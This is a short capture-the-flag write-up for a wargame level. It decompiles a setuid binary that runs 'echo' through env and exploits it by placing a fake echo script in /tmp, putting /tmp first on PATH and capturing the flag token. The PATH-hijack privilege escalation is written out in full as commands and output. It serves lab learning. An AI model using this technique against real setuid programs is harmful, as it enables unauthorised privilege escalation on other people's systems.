# level03

```bash
$ ls
level03
$ file level03
level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
$ ./level03
Exploit me
```

```bash
$ scp -P 4242 level03@192.168.179.131:/home/user/level03/level03 .
$ ghidra level03
```

main function desamble by ghidra

```bash
int main(int argc,char **argv,char **envp)

{
  __gid_t __rgid;
  __uid_t __ruid;
  int iVar1;
  gid_t gid;
  uid_t uid;

  __rgid = getegid();
  __ruid = geteuid();
  setresgid(__rgid,__rgid,__rgid);
  setresuid(__ruid,__ruid,__ruid);
  iVar1 = system("/usr/bin/env echo Exploit me");
  return iVar1;
}
```

The program executes echo from the PATH, just create a program called `echo` which will execute the `getflag` command.

```bash
$ echo "#!/bin/bash\ngetflag" > /tmp/echo
-bash: !/bin/bash\ngetflag": event not found
$ echo "/bin/sh -c getflag" > /tmp/echo
$ chmod 755 /tmp/echo
$ export PATH=/tmp:$PATH
$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
